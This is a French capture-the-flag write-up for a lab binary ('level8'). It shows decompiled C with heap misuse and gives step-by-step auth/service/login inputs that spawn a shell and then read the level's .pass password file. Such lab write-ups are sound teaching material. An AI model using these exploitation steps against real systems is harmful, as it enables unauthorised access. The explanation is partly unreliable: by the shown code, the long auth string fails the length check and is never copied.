# Level 8 - Introduction à l'exploitation binaire

## Contexte
Ce niveau présente un programme avec des vulnérabilités liées à la gestion de la mémoire. L'objectif est d'obtenir un shell en exploitant ces faiblesses.

## Configuration de sécurité
```
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX:                       No GRKERNSEC
Kernel Heap Hardening:                  No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
```

Ces informations indiquent que plusieurs protections sont désactivées, rendant le programme vulnérable à diverses attaques.

## Code source (décompilé)
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[5]; // [esp+20h] [ebp-88h] BYREF
  char v5[2]; // [esp+25h] [ebp-83h] BYREF
  char v6[129]; // [esp+27h] [ebp-81h] BYREF
  while ( 1 )
  {
    printf("%p, %p \n", auth, (const void *)service);
    if ( !fgets(s, 128, stdin) )
      break;
    if ( !memcmp(s, "auth ", 5u) )
    {
      auth = (char *)malloc(4u);
      *(_DWORD *)auth = 0;
      if ( strlen(v5) <= 0x1E )
        strcpy(auth, v5);
    }
    if ( !memcmp(s, "reset", 5u) )
      free(auth);
    if ( !memcmp(s, "service", 6u) )
      service = (int)strdup(v6);
    if ( !memcmp(s, "login", 5u) )
    {
      if ( *((_DWORD *)auth + 8) )
        system("/bin/sh");
      else
        fwrite("Password:\n", 1u, 0xAu, stdout);
    }
  }
  return 0;
}
```

## Analyse du code

1. Le programme accepte différentes commandes : "auth", "reset", "service", et "login".
2. La commande "auth" alloue 4 octets de mémoire et y copie une entrée utilisateur.
3. La commande "service" duplique une chaîne en mémoire.
4. La commande "login" vérifie une condition pour exécuter un shell.

## Vulnérabilités

1. Allocation de mémoire insuffisante : "auth" alloue seulement 4 octets.
2. Vérification de longueur incorrecte : le programme vérifie la longueur de v5 au lieu de s.
3. Utilisation de strcpy sans vérification de taille.
4. La condition pour obtenir un shell vérifie une zone mémoire au-delà de l'espace alloué.

## Stratégie d'exploitation

L'idée est de manipuler la mémoire pour que la condition de "login" soit vraie. Voici comment procéder :

1. Utiliser "auth" pour initialiser la structure et écrire au-delà de l'espace alloué.
2. Utiliser "service" pour déplacer des pointeurs en mémoire.
3. Utiliser "login" pour déclencher la vérification et obtenir un shell.

## Étapes d'exploitation

1. Lancez le programme :
   ```
   ./level8
   ```

2. Entrez la commande suivante pour initialiser "auth" :
   ```
   auth AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
   ```
   Ceci écrit au-delà des 4 octets alloués.

3. Entrez ces commandes pour manipuler la mémoire :
   ```
   service
   service BBBB
   ```
   Ceci déplace des pointeurs en mémoire.

4. Enfin, entrez :
   ```
   login
   ```
   Si tout a fonctionné, vous obtiendrez un shell.

## Explication

Cette exploitation fonctionne en manipulant la disposition de la mémoire. En allouant et en écrivant stratégiquement, nous faisons en sorte qu'une valeur non nulle se trouve à l'endroit vérifié par la commande "login".

Une fois dans le shell on va chercher le .pass